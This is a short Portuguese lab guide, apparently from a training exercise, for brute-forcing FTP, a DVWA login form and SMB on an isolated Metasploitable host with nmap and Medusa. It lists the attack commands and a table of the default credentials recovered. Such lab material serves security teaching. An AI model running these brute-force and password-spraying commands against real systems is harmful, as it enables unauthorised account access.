# ⚔️ Guia de Ataques - Medusa Brute Force

⚠️ **APENAS EM AMBIENTE ISOLADO!**

## 1. Enumeração Inicial (Nmap)
```bash
nmap -sV -sC -p 21,80,139,445 192.168.56.20 -oN scan.txt
./scripts/enum-users.sh
```

## 2. FTP Brute Force
```bash
medusa -h 192.168.56.20 -U wordlists/users.txt -P wordlists/passwords.txt -M ftp -T 20 -f
```
**Credenciais encontradas**: `msfadmin:msfadmin`
![FTP Success](images/ftp-success.png)

## 3. DVWA Web Form Brute Force
```bash
# Nível: Low
medusa -h 192.168.56.20 -u admin -P wordlists/passwords.txt -M http -m DIR:/DVWA/vulnerabilities/brute/ -T 10
```
**Login**: `admin:password`
![DVWA Success](images/dvwa-success.png)

## 4. SMB Password Spraying
```bash
# Enum usuários primeiro
nmap -p445 --script smb-enum-users 192.168.56.20

# Spraying (uma senha contra múltiplos usuários)
medusa -h 192.168.56.20 -U wordlists/users.txt -p msfadmin -M smbnt
```
![SMB Success](images/smb-success.png)

## 5. Ataque Automatizado
```bash
chmod +x scripts/brute-attack.sh
./scripts/brute-attack.sh
```

## Resultados Esperados
| Serviço | Usuário | Senha    | Tempo |
|---------|---------|----------|-------|
| FTP     | msfadmin| msfadmin | 2min  |
| DVWA    | admin   | password | 1min  |
| SMB     | msfadmin| msfadmin | 3min  |
